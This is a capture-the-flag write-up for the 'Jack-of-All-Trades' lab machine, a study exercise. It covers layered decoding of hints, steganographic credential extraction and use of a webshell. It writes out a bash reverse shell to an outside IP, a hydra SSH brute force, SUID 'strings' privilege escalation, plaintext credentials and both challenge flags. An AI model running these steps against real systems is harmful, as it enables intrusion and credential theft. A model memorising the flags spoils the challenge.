
# CTF Writeup: Jack-of-All-Trades

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.112.185.35       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 16:29 CDT
Nmap scan report for 10.112.185.35
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
```

An more detailled scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p 22,80 10.112.185.35
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 16:29 CDT
Nmap scan report for 10.112.185.35
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.67 seconds
```

The webpage wasn't accessible on port 22. I had to unban the port 22 in my firefox browser by doing the following steps.

```
1. Type about:config in the address bar and accept the risk.
2. Search for network.security.ports.banned.override
3. Create it -> String -> Add port 22
4. Restart Firefox.
```

Analyzed the source code of the webpage and found an interesting note by "Jack".

```
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
```

And also another note which stored an base64 encoded string.

```
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

The endpoint itself displays an login page. Upon inspecting the source code of the login page there is an encoded value.

```
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```

Decoded it with base32 on my local machine.

```
echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```

Received an hex value, utilized hURL tool in order to decode it.

```
hURL -x "45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246"

Original HEX      :: 45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
ASCII/RAW DEcoded :: Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
```

Utilized hURL tool again to decode the rot13 code.

```
hURL -8 "Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F"

Original string   :: Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
ROT13 decoded     :: Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

The webpage redirects us to "Stegosauria" wikipedia, which could be an hint to steganography. It also tells that the login credentials are stored in the homepage.

I downloaded the "stego.jpg" on the main homepage to my local machine and tried to extract any hidden information with NO passphrase, but it gave me the following output.

```
steghide extract -sf /home/saitama/Desktop/stego.jpg  
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

I utilized the previously discovered password & extracted an "creds.txt" file.

```
steghide extract -sf stego.jpg       
Enter passphrase: 
wrote extracted data to "creds.txt".
```

```
cat creds.txt            
Hehe. Gotcha!

You're on the right path, but wrong image!
```

Tried the same with header.jpg
```
steghide extract -sf header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".
```

Gained Credentials.

```
cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

The webpage only displays the following:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

Which could be an hint at an active webshell which grants us command execution if we add an "cmd" parameter. Let's test it!

```
http://10.112.185.35:22/nnxhweOV/index.php?cmd=whoami
www-data www-data
```

It worked!

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'
```

URL-Encoded the bash reverse shell script command with "hURL".

```
hURL -U "/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'"

Original    :: /bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'
URL ENcoded :: %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.227.246%2F80%200%3E%261%27
```

Started up netcat listener on port 80.

```
nc -lvnp 80
```

Executed the command in the browser and received reverse shell as user "www-data".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.227.246] from (UNKNOWN) [10.112.185.35] 36743
bash: cannot set terminal process group (709): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$
```

Performed Shell Hardening.

```
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Found an interesting file called "jacks_password_list" in /home directory.

```
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Stored them locally in an passwords.txt file and ran hydra in order to bruteforce ssh for user "jack".

```
hydra -l jack -P passwords.txt ssh://10.112.156.33 -s 80
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 17:40:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.112.156.33:80/
[80][ssh] host: 10.112.156.33   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 17:41:02
```

Connected via ssh as user "jack" onto the server.

```
ssh jack@10.112.156.33 -p 80
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jack@10.112.156.33's password: 
jack@jack-of-all-trades:~$
```

In /home/jack directory is an "user.jpg".

Downloaded the file using "scp".

```
scp -P 80 jack@10.112.156.33:/home/jack/user.jpg .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jack@10.112.156.33's password: 
user.jpg                                                                    100%  286KB   2.9MB/s   00:00
```

I opened the .jpg file with an tool called "ristretto".

```
ristretto user.jpg
```

Retrieved user.txt in picture.

```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

Emumerated SUID Binaries.

```
jack@jack-of-all-trades:~$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

Found "strings" binary with SUID set, checked out gtfobins and utilized the following PoC in order to read the root.txt flag.

```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```


